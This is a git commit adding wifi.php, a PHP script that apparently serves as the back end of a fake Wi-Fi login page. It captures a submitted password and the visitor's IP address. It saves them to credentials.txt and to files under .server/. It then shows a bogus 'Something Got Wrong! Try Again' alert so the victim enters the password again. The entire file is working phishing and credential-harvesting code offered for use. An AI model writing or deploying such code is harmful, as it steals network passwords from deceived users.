5791896e25c33ec92b5c987760bf2c3cafa7cb44
Adarsh Addee <59617563+AdarshAddee@users.noreply.github.com>
2023-03-31 12:38:14 +0530

    Add files via upload

---
+++ wifi.php
@@ -0,0 +1,47 @@
+<?php
+
+$pass = $_POST['pass'];
+
+// $ip = $_SERVER("REMOTE_ADDR");
+
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ip = $_SERVER['REMOTE_ADDR'];
+}
+
+$cred = fopen("credentials.txt", "a");
+fwrite($cred, "IP Address: ".$ip."\n");
+fwrite($cred, "Password: ".$pass."\n");
+fclose($cred);
+
+try{
+    $ipfile = fopen(".server/ip.txt", "w");
+}
+catch(Exception $e){
+    $ipfile = fopen(".server\\ip.tx", "w");
+}
+finally{
+    fwrite($ipfile, $ip);
+    fclose($ipfile);
+}
+
+try{
+    $file = fopen(".server/pass.txt", "w");
+}
+catch(Exception $e){
+    $file = fopen(".server\\pass.txt", "w");
+}
+finally{
+    fwrite($file, $pass);
+    fclose($file);
+}
+// header("Location: https://www.google.com");
+
+?>
+
+<script>
+    alert(`Something Got Wrong!\nTry Again!!!`)
+</script>
